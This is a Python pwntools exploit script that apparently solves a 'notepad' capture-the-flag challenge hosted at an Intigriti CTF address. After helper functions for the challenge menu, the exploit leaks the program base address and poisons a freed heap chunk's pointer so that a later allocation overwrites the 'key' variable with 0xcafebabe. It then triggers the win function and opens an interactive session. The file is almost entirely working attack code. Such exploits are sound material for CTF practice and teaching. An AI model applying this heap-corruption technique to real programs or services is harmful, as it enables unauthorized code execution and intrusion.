#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './notepad_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'notepad.ctf.intigriti.io', 1341 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================
'''
 ---------------------------------
| Symphonie der Entschlossenheit  |
 ---------------------------------
'''

def malloc(idx, size, data):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', f'{idx}'.encode())
    io.sendlineafter(b'>', f'{size}'.encode())
    io.sendafter(b'>', data)

def view(idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', f'{idx}'.encode())
    
def edit(idx, data):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'>', f'{idx}'.encode())
    io.sendafter(b'>', data)
    
def free(idx):
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b'>', f'{idx}'.encode())
    
def win():
    io.sendlineafter(b'>', b'5')
    

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(elf)
    
    io.recvuntil(b'0x')
    elf.address = int(io.recvline().strip(), 16) - elf.symbols.main
    
    malloc(0, 0x68, 'A'*8)
    malloc(1, 0x68, 'B'*8)
    
    free(0)
    free(1)
    
    edit(1, p64(elf.sym['key']))
    malloc(3, 0x68, 'A'*8)
    malloc(4, 0x68, p64(0xcafebabe))
    
    info('key: ' + hex(elf.sym['key']))
    success(f'ELF base: {hex(elf.address)}')
    
    win()

    io.interactive()
    
if __name__ == '__main__':
    exploit()